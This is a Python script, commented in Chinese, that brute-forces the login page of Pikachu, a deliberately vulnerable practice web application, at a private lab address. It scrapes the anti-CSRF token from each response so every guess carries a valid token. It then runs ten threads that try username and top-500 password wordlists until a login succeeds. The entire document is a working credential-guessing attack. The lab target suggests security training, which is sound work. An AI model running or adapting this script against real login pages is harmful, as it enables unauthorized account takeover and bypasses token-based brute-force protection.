import requests, threading, re

flag = False
get_result = {}  # 获取结果


# 抓包得知, 访问页面时,在响应的文本中自带token,在请求登录的时候,会带上本次响应的token,所以要提取出来

def guess_username_password(username_list, password_list):
    global flag, get_result
    for username in username_list:
        for password in password_list:
            if flag:  # 其他线程猜测对了,如果flag为True
                return  # 所有线程就结束了
            print(f"开始尝试用户名{username},密码{password}")
            # 1.获取token
            s = requests.session()
            # 1.从页面提取下次登录的token
            token_url = "http://192.168.12.51/pikachu-master/vul/burteforce/bf_token.php"
            result = s.get(url=token_url).text
            token = re.findall('name="token" value="(\w+)"', result)[0]
            # 2.登录请求
            url = "http://192.168.12.51/pikachu-master/vul/burteforce/bf_token.php"
            params = {"username": username, "password": password, "token": token, "submit": "Login"}
            response = s.post(url, data=params)
            if "username or password is not exists" in response.text:
                # 账号密码错误,重新来
                print("账号密码不对，重新尝试")
                continue
            else:
                get_result[username] = password
                flag = True  # 设置flag为True
                return  # 所有循环就结束了


if __name__ == '__main__':
    # 1.读取用户名
    with open("../files/usertop500.txt", "r", encoding="utf8") as usernamefile:
        usernames = [username.strip("\n") for username in usernamefile.readlines()]
    # 2.读取密码
    with open("../files/top500.txt", "r", encoding="utf8") as passwordfile:
        passwords = [password.strip("\n") for password in passwordfile.readlines()]
    """划分账户线程,密码不用切片,直接遍历"""
    threads = 10
    username_slice = len(usernames) // threads
    thread_list = []
    for i in range(threads):
        if i != (threads - 1):
            username_list = usernames[i * username_slice:(i + 1) * username_slice]  # 先拿0位,所以是拿[0:width]的切片
        else:
            username_list = usernames[i * username_slice:]  # 最后一个线程获取剩余的所有
        # 创建一个线程,并且跑起来
        t = threading.Thread(target=guess_username_password, args=(username_list, passwords))
        thread_list.append(t)

    # 启动所有线程
    for t in thread_list:
        t.start()
    # 等待所有线程完成
    for t in thread_list:
        t.join()
    print(f"拿到的正确用户名和密码是{get_result}".center(150, "-"))
